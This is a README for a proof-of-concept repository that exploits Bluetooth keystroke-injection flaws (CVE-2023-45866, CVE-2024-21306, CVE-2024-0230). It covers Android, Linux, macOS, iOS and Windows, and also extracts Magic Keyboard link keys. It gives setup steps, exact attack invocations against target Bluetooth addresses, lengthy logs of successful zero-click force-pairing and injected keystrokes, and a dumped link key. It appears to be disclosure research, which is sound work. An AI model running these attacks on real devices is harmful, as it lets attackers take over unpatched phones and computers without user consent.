# Hi, My Name is Keyboard

This repository contains proof-of-concept scripts for CVE-2023-45866, CVE-2024-21306, and CVE-2024-0230. Additional details can be found in the [blog post](https://github.com/skysafe/reblog/blob/main/cve-2024-0230/README.md).

| Proof of Concept | Description |
|-|-|
| [Android Keystroke Injection](#android-keystroke-injection) | Force-pairs a virtual Bluetooth keyboard with a vulnerable Android device and injects 10 seconds of `tab` keypresses. |
| [Linux Keystroke Injection](#linux-keystroke-injection) | Force-pairs a virtual Bluetooth keyboard with a Linux host and injects 10 seconds of `tab` keypresses. |
| [macOS Keystroke Injection](#macos-keystroke-injection) | Force-pairs a virtual Bluetooth keyboard with a macOS host and injects keystrokes to open a web browser and perform a Google search. |
| [iOS Keystroke Injection](#ios-keystroke-injection) | Force-pairs a virtual Bluetooth keyboard with an iOS host and injects keystrokes to open a web browser and navigate to a URL. |
| [Windows Keystroke Injection](windows-report.md) | Force-pairs a virtual Bluetooth keyboard with a Windows host and injects `tab` keypresses. |
| [Magic Keyboard Link Key via Lightning Port](#magic-keyboard-link-key-via-lightning-port) | Reads the Bluetooth link key from the Lightning port on a Magic Keyboard. |
| [Magic Keyboard Link Key via Bluetooth](#magic-keyboard-link-key-via-bluetooth) | Reads the Bluetooth link key from the unauthenticated Bluetooth HID service on the Magic Keyboard. |
| [Magic Keyboard Link Key via USB Port on the Mac](#magic-keyboard-link-key-via-usb-port-on-mac) | Reads the Bluetooth link key for a target Magic Keyboard by spoofing the keyboard over USB to its paired Mac. |

## Dependencies

The scripts are known to work on an Ubuntu 22.04 host with a Broadcom-based Bluetooth adapter.

I primarily used this adapter: https://www.amazon.com/Kinivo-USB-Bluetooth-4-0-Compatible/dp/B007Q45EF4

```
Bus 001 Device 026: ID 0a5c:21e8 Broadcom Corp. BCM20702A0 Bluetooth 4.0
```

Starting from a clean install of Ubuntu 22.04, the dependencies can be installed with the following commands.

```
# update apt
sudo apt-get update
sudo apt-get -y upgrade

# install dependencies from apt
sudo apt install -y bluez-tools bluez-hcidump libbluetooth-dev \
                    git gcc python3-pip python3-setuptools \
                    python3-pydbus

# install pybluez from source
git clone https://github.com/pybluez/pybluez.git
cd pybluez
sudo python3 setup.py install

# build bdaddr from the bluez source
cd ~/
git clone --depth=1 https://github.com/bluez/bluez.git
gcc -o bdaddr ~/bluez/tools/bdaddr.c ~/bluez/src/oui.c -I ~/bluez -lbluetooth
sudo cp bdaddr /usr/local/bin/
```

## Keystroke Injection

### Android Keystroke Injection

Android devices are vulnerable prior to the 2023-12-05 security patch level.

When Bluetooth is enabled on an unpatched Android device, an attacker can pair an emulated Bluetooth keyboard and inject keystrokes, without user confirmation. This is a zero-click attack that works whenever Bluetooth is enabled.

#### Affected Versions

This vulnerability affects Android ~4.2.2 and later.

- Android 4.2.2 - 10 will not be patched
- Android 11 - 14 have patches available (2023-12-05 security patch level)
- Pixel 6, 7 and 8 were patched
- Pixel 5 and older remain vulnerable

#### Starting State

- Bluetooth is enabled on the target Android device

#### Running the PoC

Run the PoC targeting Android device `5C:F3:70:AA:07:BD` using interface `hci1`.

```
./keystroke-injection-android-linux.py -i hci1 -t 5C:F3:70:AA:07:BD
```

If successful, the PoC will inject a payload of `tab` keystrokes for 10 seconds.

#### Example Output

```
> ./keystroke-injection-android-linux.py -i hci1 -t 5C:F3:70:AA:07:BD
[2024-01-07 11:03:01.329]  executing 'sudo service bluetooth restart'
[2024-01-07 11:03:01.959]  configuring Bluetooth adapter
[2024-01-07 11:03:01.963]  calling RegisterProfile
[2024-01-07 11:03:01.966]  running dbus loop
[2024-01-07 11:03:02.096]  executing 'sudo hciconfig hci1 name Hi, My Name is Keyboard'
[2024-01-07 11:03:02.108]  executing 'hciconfig hci1 name'
[2024-01-07 11:03:02.128]  executing 'sudo hciconfig hci1 class 0x002540'
[2024-01-07 11:03:02.141]  executing 'hciconfig hci1 class'
[2024-01-07 11:03:02.144]  executing 'hcitool name 5C:F3:70:AA:07:BD'
[2024-01-07 11:03:02.877]  connecting to SDP
[2024-01-07 11:03:02.877]  connecting to 5C:F3:70:AA:07:BD on port 1
[2024-01-07 11:03:03.832]  SUCCESS! connected on port 1
[2024-01-07 11:03:03.832]  executing 'sudo btmgmt --index hci1 io-cap 1'
[2024-01-07 11:03:03.847]  executing 'sudo btmgmt --index hci1 ssp 1'
[2024-01-07 11:03:03.858]  connected to SDP (L2CAP 1) on target
[2024-01-07 11:03:03.865]  'NoInputNoOutput' pairing-agent is running
[2024-01-07 11:03:04.111]  connecting to 5C:F3:70:AA:07:BD on port 19
[2024-01-07 11:03:04.864]  ERROR connecting on port 19: [Errno 22] Invalid argument
[2024-01-07 11:03:04.864]  connecting to 5C:F3:70:AA:07:BD on port 17
[2024-01-07 11:03:04.932]  SUCCESS! connected on port 17
[2024-01-07 11:03:04.932]  connecting to HID Interrupt
[2024-01-07 11:03:04.932]  connecting to 5C:F3:70:AA:07:BD on port 19
[2024-01-07 11:03:05.008]  SUCCESS! connected on port 19
[2024-01-07 11:03:05.008]  connected to HID Interrupt (L2CAP 19) on target
[2024-01-07 11:03:05.008]  connected to HID Control (L2CAP 17) on target
[2024-01-07 11:03:05.009]  [RX-17] 9000
[2024-01-07 11:03:05.009]  [TX-17] 00
[2024-01-07 11:03:05.065]  [RX-19] a20101
[2024-01-07 11:03:05.259]  [TX-19] a101000000000000000000
[2024-01-07 11:03:05.259]  injecting Tab keypresses for 10 seconds
[2024-01-07 11:03:05.259]  [TX-19] a10100002b000000000000
[2024-01-07 11:03:05.264]  [TX-19] a101000000000000000000
[2024-01-07 11:03:05.318]  [TX-19] a10100002b000000000000
[2024-01-07 11:03:05.323]  [TX-19] a101000000000000000000
[2024-01-07 11:03:05.377]  [TX-19] a10100002b000000000000
[2024-01-07 11:03:05.382]  [TX-19] a101000000000000000000
[2024-01-07 11:03:05.436]  [TX-19] a10100002b000000000000
...
[2024-01-07 11:03:15.261]  [TX-19] a101000000000000000000
[2024-01-07 11:03:15.319]  payload has been transmitted; disconnecting Bluetooth HID client
[2024-01-07 11:03:15.321]  taking 'hci1' offline
```

### Linux Keystroke Injection

Linux hosts running BlueZ 5 are vulnerable prior to patches rolling out in approximately December 2023. Specific version numbers depend on the Linux distribution.

When an unpatched Linux host is discoverable and connectable over Bluetooth, an attacker can pair an emulated Bluetooth keyboard and inject keystrokes, without user confirmation. This is a zero-click attack that works whenever the host is discoverable and connectable.

#### Affected Versions

This vulnerability is understood to affect unpatched Linux distributions using the default configuration of BlueZ 5.

Google states that ChromeOS was not affected by this vulnerability, and while ChromeOS was not tested as part of this research, their BlueZ configuration does appear to prevent the attack.

Affected distributions include Ubuntu, Debian, Gentoo, Arch, Fedora, Red Hat, Yocto, and Amazon Linux. Multiple releases may be affected, and Ubuntu, for instance, patched 16.04, 18.04, 20.04, 22.04, 23.04 and 23.10.

#### Starting State

- The target Linux host is discoverable and connectable over Bluetooth.
- Linux hosts are commonly discoverable and connectable when the Bluetooth settings panel is open.

#### Running the PoC

Run the PoC targeting Linux host `58:28:39:E6:AE:1C` using interface `hci1`.

```
./keystroke-injection-android-linux.py -i hci1 -t 58:28:39:E6:AE:1C
```

If successful, the PoC will inject a payload of `tab` keystrokes for 10 seconds.

#### Example Output

```
> ./keystroke-injection-android-linux.py -i hci1 -t 58:28:39:E6:AE:1C
[2024-01-07 11:00:08.955]  executing 'sudo service bluetooth restart'
[2024-01-07 11:00:09.586]  configuring Bluetooth adapter
[2024-01-07 11:00:09.590]  calling RegisterProfile
[2024-01-07 11:00:09.595]  running dbus loop
[2024-01-07 11:00:09.725]  executing 'sudo hciconfig hci1 name Hi, My Name is Keyboard'
[2024-01-07 11:00:09.738]  executing 'hciconfig hci1 name'
[2024-01-07 11:00:09.759]  executing 'sudo hciconfig hci1 class 0x002540'
[2024-01-07 11:00:09.771]  executing 'hciconfig hci1 class'
[2024-01-07 11:00:09.774]  executing 'hcitool name 58:28:39:E6:AE:1C'
[2024-01-07 11:00:10.399]  connecting to SDP
[2024-01-07 11:00:10.400]  connecting to 58:28:39:E6:AE:1C on port 1
[2024-01-07 11:00:12.984]  SUCCESS! connected on port 1
[2024-01-07 11:00:12.984]  executing 'sudo btmgmt --index hci1 io-cap 1'
[2024-01-07 11:00:12.992]  executing 'sudo btmgmt --index hci1 ssp 1'
[2024-01-07 11:00:13.001]  connected to SDP (L2CAP 1) on target
[2024-01-07 11:00:13.011]  'NoInputNoOutput' pairing-agent is running
[2024-01-07 11:00:13.253]  connecting to 58:28:39:E6:AE:1C on port 19
[2024-01-07 11:00:15.020]  ERROR connecting on port 19: [Errno 22] Invalid argument
[2024-01-07 11:00:15.020]  connecting to 58:28:39:E6:AE:1C on port 17
[2024-01-07 11:00:15.296]  SUCCESS! connected on port 17
[2024-01-07 11:00:15.296]  connecting to HID Interrupt
[2024-01-07 11:00:15.296]  connecting to 58:28:39:E6:AE:1C on port 19
[2024-01-07 11:00:15.296]  [RX-17] 15
[2024-01-07 11:00:15.500]  ERROR connecting on port 19: [Errno 22] Invalid argument
[2024-01-07 11:00:15.500]  connecting to HID Interrupt
[2024-01-07 11:00:15.501]  connecting to 58:28:39:E6:AE:1C on port 19
[2024-01-07 11:00:15.636]  ERROR connecting on port 19: [Errno 22] Invalid argument
[2024-01-07 11:00:15.636]  connecting to HID Interrupt
[2024-01-07 11:00:15.638]  connecting to 58:28:39:E6:AE:1C on port 19
[2024-01-07 11:00:15.764]  ERROR connecting on port 19: [Errno 22] Invalid argument
[2024-01-07 11:00:15.764]  connecting to HID Interrupt
[2024-01-07 11:00:15.766]  connecting to 58:28:39:E6:AE:1C on port 19
[2024-01-07 11:00:15.784]  ERROR connecting on port 19: [Errno 22] Invalid argument
[2024-01-07 11:00:15.784]  connecting to HID Interrupt
[2024-01-07 11:00:15.785]  connecting to 58:28:39:E6:AE:1C on port 19
[2024-01-07 11:00:15.832]  ERROR connecting on port 19: [Errno 22] Invalid argument
[2024-01-07 11:00:15.832]  connecting to HID Interrupt
[2024-01-07 11:00:15.833]  connecting to 58:28:39:E6:AE:1C on port 19
[2024-01-07 11:00:15.880]  ERROR connecting on port 19: [Errno 22] Invalid argument
[2024-01-07 11:00:15.880]  connecting to HID Interrupt
[2024-01-07 11:00:15.881]  connecting to 58:28:39:E6:AE:1C on port 19
[2024-01-07 11:00:16.160]  ERROR connecting on port 19: [Errno 22] Invalid argument
[2024-01-07 11:00:16.160]  connecting to HID Interrupt
[2024-01-07 11:00:16.161]  connecting to 58:28:39:E6:AE:1C on port 19
[2024-01-07 11:00:16.300]  ERROR connecting on port 19: [Errno 22] Invalid argument
[2024-01-07 11:00:16.300]  connecting to HID Interrupt
[2024-01-07 11:00:16.301]  connecting to 58:28:39:E6:AE:1C on port 19
[2024-01-07 11:00:16.580]  SUCCESS! connected on port 19
[2024-01-07 11:00:16.580]  connected to HID Interrupt (L2CAP 19) on target
[2024-01-07 11:00:16.580]  connecting to HID Control
[2024-01-07 11:00:16.580]  connecting to 58:28:39:E6:AE:1C on port 17
[2024-01-07 11:00:16.859]  SUCCESS! connected on port 17
[2024-01-07 11:00:16.860]  connected to HID Control (L2CAP 17) on target
[2024-01-07 11:00:16.860]  [RX-17] 4190
[2024-01-07 11:00:16.860]  [TX-17] 00
[2024-01-07 11:00:17.110]  [TX-19] a101000000000000000000
[2024-01-07 11:00:17.110]  injecting Tab keypresses for 10 seconds
[2024-01-07 11:00:17.111]  [TX-19] a10100002b000000000000
[2024-01-07 11:00:17.115]  [TX-19] a101000000000000000000
[2024-01-07 11:00:17.170]  [TX-19] a10100002b000000000000
[2024-01-07 11:00:17.174]  [TX-19] a101000000000000000000
[2024-01-07 11:00:17.229]  [TX-19] a10100002b000000000000
[2024-01-07 11:00:17.233]  [TX-19] a101000000000000000000
[2024-01-07 11:00:17.288]  [TX-19] a10100002b000000000000
[2024-01-07 11:00:17.292]  [TX-19] a101000000000000000000
[2024-01-07 11:00:17.347]  [TX-19] a10100002b000000000000
[2024-01-07 11:00:17.352]  [TX-19] a101000000000000000000
[2024-01-07 11:00:17.406]  [TX-19] a10100002b000000000000
[2024-01-07 11:00:17.410]  [TX-19] a101000000000000000000
[2024-01-07 11:00:17.465]  [TX-19] a10100002b000000000000
[2024-01-07 11:00:17.469]  [TX-19] a101000000000000000000
[2024-01-07 11:00:17.524]  [TX-19] a10100002b000000000000
[2024-01-07 11:00:17.528]  [TX-19] a101000000000000000000
[2024-01-07 11:00:17.583]  [TX-19] a10100002b000000000000
[2024-01-07 11:00:17.587]  [TX-19] a101000000000000000000
[2024-01-07 11:00:17.642]  [TX-19] a10100002b000000000000
[2024-01-07 11:00:17.646]  [TX-19] a101000000000000000000
[2024-01-07 11:00:17.701]  [TX-19] a10100002b000000000000
[2024-01-07 11:00:17.705]  [TX-19] a101000000000000000000
[2024-01-07 11:00:17.759]  [TX-19] a10100002b000000000000
[2024-01-07 11:00:17.764]  [TX-19] a101000000000000000000
[2024-01-07 11:00:17.818]  [TX-19] a10100002b000000000000
[2024-01-07 11:00:17.823]  [TX-19] a101000000000000000000
[2024-01-07 11:00:17.877]  [TX-19] a10100002b000000000000
[2024-01-07 11:00:17.882]  [TX-19] a101000000000000000000
[2024-01-07 11:00:17.936]  [TX-19] a10100002b000000000000
[2024-01-07 11:00:17.941]  [TX-19] a101000000000000000000
[2024-01-07 11:00:17.995]  [TX-19] a10100002b000000000000
[2024-01-07 11:00:18.000]  [TX-19] a101000000000000000000
[2024-01-07 11:00:18.054]  [TX-19] a10100002b000000000000
[2024-01-07 11:00:18.059]  [TX-19] a101000000000000000000
[2024-01-07 11:00:18.113]  [TX-19] a10100002b000000000000
[2024-01-07 11:00:18.118]  [TX-19] a101000000000000000000
[2024-01-07 11:00:18.172]  [TX-19] a10100002b000000000000
...
[2024-01-07 11:00:27.102]  [TX-19] a101000000000000000000
[2024-01-07 11:00:27.157]  payload has been transmitted; disconnecting Bluetooth HID client
[2024-01-07 11:00:27.157]  taking 'hci1' offline
```

### macOS Keystroke Injection

When a Mac is attempting to connect to a paired Magic Keyboard over Bluetooth, an attacker can spoof the Magic Keyboard to the Mac, pair a virtual Bluetooth keyboard, and inject keystrokes without user confirmation.

This attack has a timing component, where the attacker must connect to the Mac at the precise moment the Mac attempts to connect to the Magic Keyboard.

The included PoC fires when a Magic Keyboard is unplugged from its Mac (after e.g. charging or pairing). The PoC uses the Bluetooth SDP service on the Mac as a side-channel to observe the unplug event and trigger the attack. This is a zero-click attack that requires observing a Magic Keyboard get unplugged from a Mac.

#### Affected Versions

- macOS 14 is vulnerable prior to 14.2
- macOS 13 and 12 are vulnerable with no patch expected
- macOS 11 and older were not tested

#### Starting State

- Bluetooth is enabled on the Mac.
- The Magic Keyboard is powered on and connected the Mac using a Lightning-to-USB cable.
- The PoC injects keystrokes to open a web browser and perform a Google search. It is also possible to inject keystrokes at the login screen, however this PoC assumes that the Mac is at an active session.

#### Running the PoC

```
> ./keystroke-injection-macos.py --help
usage: keystroke-injection-macos.py [-h] -i INTERFACE -t TARGET_ADDRESS -k KEYBOARD_ADDRESS

options:
  -h, --help            show this help message and exit
  -i INTERFACE, --interface INTERFACE
  -t TARGET_ADDRESS, --target_address TARGET_ADDRESS
  -k KEYBOARD_ADDRESS, --keyboard_address KEYBOARD_ADDRESS
```

##### Invocation

```
./keystroke-injection-macos.py -i hci1 -t 50:DE:06:A8:E1:CA -k 1C:57:DC:88:55:02
```
##### Output

```
[2024-01-07 12:25:43.777]  executing 'sudo service bluetooth restart'
[2024-01-07 12:25:44.324]  configuring Bluetooth adapter
[2024-01-07 12:25:44.461]  executing 'sudo hciconfig hci1 name Hi, My Name is Keyboard'
[2024-01-07 12:25:44.474]  executing 'hciconfig hci1 name'
[2024-01-07 12:25:44.493]  executing 'sudo hciconfig hci1 class 0x002540'
[2024-01-07 12:25:44.506]  executing 'hciconfig hci1 class'
[2024-01-07 12:25:44.509]  executing 'sudo bdaddr -i hci1 1C:57:DC:88:55:02'
[2024-01-07 12:25:44.649]  executing 'hciconfig hci1'
[2024-01-07 12:25:44.652]  connecting to SDP
[2024-01-07 12:25:44.652]  connecting to 50:DE:06:A8:E1:CA on port 1
[2024-01-07 12:25:45.776]  SUCCESS! connected on port 1
[2024-01-07 12:25:45.776]  executing 'sudo btmgmt --index hci1 io-cap 1'
[2024-01-07 12:25:45.788]  executing 'sudo btmgmt --index hci1 ssp 1'
[2024-01-07 12:25:45.795]  connected to SDP (L2CAP 1) on target
[2024-01-07 12:25:45.795]  

----------------------------------------------------------------
| Unplug the Magic Keyboard from the Mac to trigger the attack |
----------------------------------------------------------------

[2024-01-07 12:25:46.014]  b'HCI sniffer - Bluetooth packet analyzer ver 5.64\n'
[2024-01-07 12:25:46.015]  b'device: hci1 snap_len: 1500 filter: 0xffffffffffffffff\n'
[2024-01-07 12:25:46.017]  b'> HCI Event: Number of Completed Packets (0x13) plen 5\n'
[2024-01-07 12:25:46.018]  b'    handle 11 packets 1\n'
[2024-01-07 12:25:47.296]  b'> ACL data: handle 11 flags 0x02 dlen 12\n'
[2024-01-07 12:25:47.297]  b'    L2CAP(s): Connect req: psm 1 scid 0x0506\n'
[2024-01-07 12:25:47.337]  connecting to HID Control
[2024-01-07 12:25:47.337]  connecting to 50:DE:06:A8:E1:CA on port 17
[2024-01-07 12:25:47.788]  ERROR connecting on port 17: [Errno 22] Invalid argument
[2024-01-07 12:25:47.788]  connecting to HID Control
[2024-01-07 12:25:47.799]  connecting to 50:DE:06:A8:E1:CA on port 17
[2024-01-07 12:25:47.908]  SUCCESS! connected on port 17
[2024-01-07 12:25:47.908]  connected to HID Control (L2CAP 17) on target
[2024-01-07 12:25:47.908]  connecting to HID Interrupt
[2024-01-07 12:25:47.908]  connecting to 50:DE:06:A8:E1:CA on port 19
[2024-01-07 12:25:47.976]  SUCCESS! connected on port 19
[2024-01-07 12:25:47.976]  connected to HID Interrupt (L2CAP 19) on target
[2024-01-07 12:25:47.976]  [TX-19] a101000000000000000000
[2024-01-07 12:25:48.012]  [RX-17] 71
[2024-01-07 12:25:48.013]  [TX-17] 00
[2024-01-07 12:25:48.048]  [RX-17] 53c601180121
[2024-01-07 12:25:48.048]  [TX-17] 00
[2024-01-07 12:25:48.084]  [RX-17] 53ffbb
[2024-01-07 12:25:48.084]  [TX-17] 00
[2024-01-07 12:25:48.116]  [RX-17] 43f0
[2024-01-07 12:25:48.116]  [TX-17] 00
[2024-01-07 12:25:48.159]  [RX-17] 53ff90
[2024-01-07 12:25:48.160]  [TX-17] 00
[2024-01-07 12:25:48.192]  [RX-17] 41f0
[2024-01-07 12:25:48.192]  [TX-17] 00
[2024-01-07 12:25:48.228]  [RX-17] 53ff34
[2024-01-07 12:25:48.228]  [TX-17] 00
[2024-01-07 12:25:48.265]  [RX-17] 43f0
[2024-01-07 12:25:48.265]  [TX-17] 00
[2024-01-07 12:25:48.296]  [RX-17] 53ff90
[2024-01-07 12:25:48.296]  [TX-17] 00
[2024-01-07 12:25:48.308]  [RX-17] 41f0
[2024-01-07 12:25:48.309]  [TX-17] 00
[2024-01-07 12:25:48.344]  [RX-17] 53ffe0
[2024-01-07 12:25:48.344]  [TX-17] 00
[2024-01-07 12:25:48.376]  [RX-17] 43f0
[2024-01-07 12:25:48.376]  [TX-17] 00
[2024-01-07 12:25:48.413]  [RX-17] 53ff14
[2024-01-07 12:25:48.413]  [TX-17] 00
[2024-01-07 12:25:48.456]  [RX-17] 43f0
[2024-01-07 12:25:48.456]  [TX-17] 00
[2024-01-07 12:25:48.492]  [RX-17] 53ffc5
[2024-01-07 12:25:48.493]  [TX-17] 00
[2024-01-07 12:25:48.528]  [RX-17] 43f0
[2024-01-07 12:25:48.528]  [TX-17] 00
[2024-01-07 12:25:48.572]  [RX-17] 53ff02
[2024-01-07 12:25:48.573]  [TX-17] 00
[2024-01-07 12:25:48.607]  [RX-17] 43f1
[2024-01-07 12:25:48.608]  [TX-17] 00
[2024-01-07 12:25:48.644]  [RX-19] a2f10100
[2024-01-07 12:25:48.645]  injecting payload
[2024-01-07 12:25:48.645]  [TX-19] a1010800e32c0000000000
[2024-01-07 12:25:48.646]  [RX-19] a2f10100
[2024-01-07 12:25:48.647]  [RX-19] a2f10100
[2024-01-07 12:25:48.649]  [RX-19] a2f10100
[2024-01-07 12:25:48.650]  [RX-19] a2f10100
[2024-01-07 12:25:48.653]  [RX-17] 53ff03
[2024-01-07 12:25:48.653]  [TX-17] 00
[2024-01-07 12:25:48.680]  [RX-17] 43f1
[2024-01-07 12:25:48.680]  [TX-17] 00
[2024-01-07 12:25:48.896]  [TX-19] a101000017000000000000
[2024-01-07 12:25:48.900]  [TX-19] a101000000000000000000
[2024-01-07 12:25:48.905]  [TX-19] a101000008000000000000
[2024-01-07 12:25:48.909]  [TX-19] a101000000000000000000
[2024-01-07 12:25:48.914]  [TX-19] a101000015000000000000
[2024-01-07 12:25:48.918]  [TX-19] a101000000000000000000
[2024-01-07 12:25:48.922]  [TX-19] a101000010000000000000
[2024-01-07 12:25:48.927]  [TX-19] a101000000000000000000
[2024-01-07 12:25:48.931]  [TX-19] a10100000c000000000000
[2024-01-07 12:25:48.936]  [TX-19] a101000000000000000000
[2024-01-07 12:25:48.940]  [TX-19] a101000011000000000000
[2024-01-07 12:25:48.944]  [TX-19] a101000000000000000000
[2024-01-07 12:25:48.949]  [TX-19] a101000004000000000000
[2024-01-07 12:25:48.953]  [TX-19] a101000000000000000000
[2024-01-07 12:25:48.958]  [TX-19] a10100000f000000000000
[2024-01-07 12:25:48.962]  [TX-19] a101000000000000000000
[2024-01-07 12:25:48.966]  [TX-19] a101000028000000000000
[2024-01-07 12:25:48.971]  [TX-19] a101000000000000000000
[2024-01-07 12:25:49.225]  [TX-19] a101010006e00000000000
[2024-01-07 12:25:49.230]  [TX-19] a101000000000000000000
[2024-01-07 12:25:49.234]  [TX-19] a101000012000000000000
[2024-01-07 12:25:49.239]  [TX-19] a101000000000000000000
[2024-01-07 12:25:49.244]  [TX-19] a101000013000000000000
[2024-01-07 12:25:49.248]  [TX-19] a101000000000000000000
[2024-01-07 12:25:49.252]  [TX-19] a101000008000000000000
[2024-01-07 12:25:49.256]  [TX-19] a101000000000000000000
[2024-01-07 12:25:49.261]  [TX-19] a101000011000000000000
[2024-01-07 12:25:49.265]  [TX-19] a101000000000000000000
[2024-01-07 12:25:49.269]  [TX-19] a10100002c000000000000
[2024-01-07 12:25:49.274]  [TX-19] a101000000000000000000
[2024-01-07 12:25:49.278]  [TX-19] a101020034e10000000000
[2024-01-07 12:25:49.283]  [TX-19] a101000000000000000000
[2024-01-07 12:25:49.287]  [TX-19] a10100000b000000000000
[2024-01-07 12:25:49.291]  [TX-19] a101000000000000000000
[2024-01-07 12:25:49.296]  [TX-19] a101000017000000000000
[2024-01-07 12:25:49.300]  [TX-19] a101000000000000000000
[2024-01-07 12:25:49.304]  [TX-19] a101000017000000000000
[2024-01-07 12:25:49.309]  [TX-19] a101000000000000000000
[2024-01-07 12:25:49.313]  [TX-19] a101000013000000000000
[2024-01-07 12:25:49.318]  [TX-19] a101000000000000000000
[2024-01-07 12:25:49.322]  [TX-19] a101000016000000000000
[2024-01-07 12:25:49.327]  [TX-19] a101000000000000000000
[2024-01-07 12:25:49.331]  [TX-19] a101020033e10000000000
[2024-01-07 12:25:49.335]  [TX-19] a101000000000000000000
[2024-01-07 12:25:49.340]  [TX-19] a101000038000000000000
[2024-01-07 12:25:49.344]  [TX-19] a101000000000000000000
[2024-01-07 12:25:49.349]  [TX-19] a101000038000000000000
[2024-01-07 12:25:49.353]  [TX-19] a101000000000000000000
[2024-01-07 12:25:49.358]  [TX-19] a10100000a000000000000
[2024-01-07 12:25:49.362]  [TX-19] a101000000000000000000
[2024-01-07 12:25:49.367]  [TX-19] a101000012000000000000
[2024-01-07 12:25:49.371]  [TX-19] a101000000000000000000
[2024-01-07 12:25:49.376]  [TX-19] a101000012000000000000
[2024-01-07 12:25:49.380]  [TX-19] a101000000000000000000
[2024-01-07 12:25:49.385]  [TX-19] a10100000a000000000000
[2024-01-07 12:25:49.389]  [TX-19] a101000000000000000000
[2024-01-07 12:25:49.393]  [TX-19] a10100000f000000000000
[2024-01-07 12:25:49.398]  [TX-19] a101000000000000000000
[2024-01-07 12:25:49.402]  [TX-19] a101000008000000000000
[2024-01-07 12:25:49.407]  [TX-19] a101000000000000000000
[2024-01-07 12:25:49.411]  [TX-19] a101000037000000000000
[2024-01-07 12:25:49.416]  [TX-19] a101000000000000000000
[2024-01-07 12:25:49.420]  [TX-19] a101000006000000000000
[2024-01-07 12:25:49.424]  [TX-19] a101000000000000000000
[2024-01-07 12:25:49.429]  [TX-19] a101000012000000000000
[2024-01-07 12:25:49.433]  [TX-19] a101000000000000000000
[2024-01-07 12:25:49.438]  [TX-19] a101000010000000000000
[2024-01-07 12:25:49.442]  [TX-19] a101000000000000000000
[2024-01-07 12:25:49.447]  [TX-19] a101000038000000000000
[2024-01-07 12:25:49.451]  [TX-19] a101000000000000000000
[2024-01-07 12:25:49.455]  [TX-19] a101000016000000000000
[2024-01-07 12:25:49.460]  [TX-19] a101000000000000000000
[2024-01-07 12:25:49.464]  [TX-19] a101000008000000000000
[2024-01-07 12:25:49.468]  [TX-19] a101000000000000000000
[2024-01-07 12:25:49.473]  [TX-19] a101000004000000000000
[2024-01-07 12:25:49.477]  [TX-19] a101000000000000000000
[2024-01-07 12:25:49.482]  [TX-19] a101000015000000000000
[2024-01-07 12:25:49.486]  [TX-19] a101000000000000000000
[2024-01-07 12:25:49.491]  [TX-19] a101000006000000000000
[2024-01-07 12:25:49.495]  [TX-19] a101000000000000000000
[2024-01-07 12:25:49.499]  [TX-19] a10100000b000000000000
[2024-01-07 12:25:49.504]  [TX-19] a101000000000000000000
[2024-01-07 12:25:49.508]  [TX-19] a101020038e10000000000
[2024-01-07 12:25:49.513]  [TX-19] a101000000000000000000
[2024-01-07 12:25:49.517]  [TX-19] a101000014000000000000
[2024-01-07 12:25:49.522]  [TX-19] a101000000000000000000
[2024-01-07 12:25:49.526]  [TX-19] a10100002e000000000000
[2024-01-07 12:25:49.531]  [TX-19] a101000000000000000000
[2024-01-07 12:25:49.535]  [TX-19] a101000017000000000000
[2024-01-07 12:25:49.540]  [TX-19] a101000000000000000000
[2024-01-07 12:25:49.544]  [TX-19] a10100000b000000000000
[2024-01-07 12:25:49.549]  [TX-19] a101000000000000000000
[2024-01-07 12:25:49.553]  [TX-19] a10100000c000000000000
[2024-01-07 12:25:49.558]  [TX-19] a101000000000000000000
[2024-01-07 12:25:49.562]  [TX-19] a101000016000000000000
[2024-01-07 12:25:49.567]  [TX-19] a101000000000000000000
[2024-01-07 12:25:49.571]  [TX-19] a10102002ee10000000000
[2024-01-07 12:25:49.576]  [TX-19] a101000000000000000000
[2024-01-07 12:25:49.580]  [TX-19] a10100000c000000000000
[2024-01-07 12:25:49.585]  [TX-19] a101000000000000000000
[2024-01-07 12:25:49.589]  [TX-19] a101000016000000000000
[2024-01-07 12:25:49.593]  [TX-19] a101000000000000000000
[2024-01-07 12:25:49.598]  [TX-19] a10102002ee10000000000
[2024-01-07 12:25:49.602]  [TX-19] a101000000000000000000
[2024-01-07 12:25:49.607]  [TX-19] a101000009000000000000
[2024-01-07 12:25:49.611]  [TX-19] a101000000000000000000
[2024-01-07 12:25:49.616]  [TX-19] a10100000c000000000000
[2024-01-07 12:25:49.620]  [TX-19] a101000000000000000000
[2024-01-07 12:25:49.625]  [TX-19] a101000011000000000000
[2024-01-07 12:25:49.629]  [TX-19] a101000000000000000000
[2024-01-07 12:25:49.633]  [TX-19] a101000008000000000000
[2024-01-07 12:25:49.638]  [TX-19] a101000000000000000000
[2024-01-07 12:25:49.642]  [TX-19] a101020034e10000000000
[2024-01-07 12:25:49.646]  [TX-19] a101000000000000000000
[2024-01-07 12:25:49.651]  [TX-19] a101000028000000000000
[2024-01-07 12:25:49.655]  [TX-19] a101000000000000000000
[2024-01-07 12:25:49.760]  payload has been transmitted; disconnecting Bluetooth HID client
[2024-01-07 12:25:49.761]  taking 'hci1' offline
```

## Link Key Extraction

### Magic Keyboard Link Key via Lightning Port

When the Magic Keyboard is plugged into the Mac, the Mac sends the Bluetooth link key to the Magic Keyboard over USB.

The link key remains in memory until the Magic Keyboard is powered off, and can be read by an attacker with access to the lightning port on the keyboard.

#### Affected Versions

The following Apple peripherals were tested and found vulnerable to this attack. No other peripherals were tested, so this list may be incomplete.

| Product Name | Model Number |
|-|-|
| Magic Keyboard | A2450 |
| Magic Keyboard with Touch ID | A2449 |
| Magic Keyboard with Numeric Keypad | A1843 |
| Magic Keyboard with Touch ID and Numeric Keypad | A2520 |
| Magic Mouse | A1657 |

#### Starting State

- Magic Keyboard has remained powered on since it was last plugged into the Mac

#### Running the PoC

Plug the Magic Keyboard into the Linux computer with a Lightning-to-USB cable and run the script with no parameters.

```
./read-link-key-lightning.py
```

#### Output

```
Model          - Magic Keyboard
Serial Number  - F1T2107RUNW12NXA9
BT Address     - 1c:57:fc:08:65:12
Mac BT Address - a4:c3:99:e8:a8:6c
BT Link Key    - c95e3ec98809f2745d32029e7f97b67e
```

### Magic Keyboard Link Key via USB Port on Mac

When the Magic Keyboard is plugged into the Mac, the Mac sends the Bluetooth link key to the Magic Keyboard over USB.

The next time the Magic Keyboard is plugged into the Mac, it is recognized by its Bluetooth address and serial number, and the Mac sends the original link key to the Magic Keyboard.

If an attacker knows the Bluetooth address and serial number of a target Magic Keyboard, they can spoof the Magic Keyboard to the Mac over USB, and read the target link key from the USB port on the Mac.

The PoC implements this attack by writing the target Bluetooth address and serial number to a donor keyboard, plugging the donor keyboard into the Mac, and then reading the link key off of the donor keyboard.

This attack can be mitigated my enabling Lockdown Mode on the Mac.

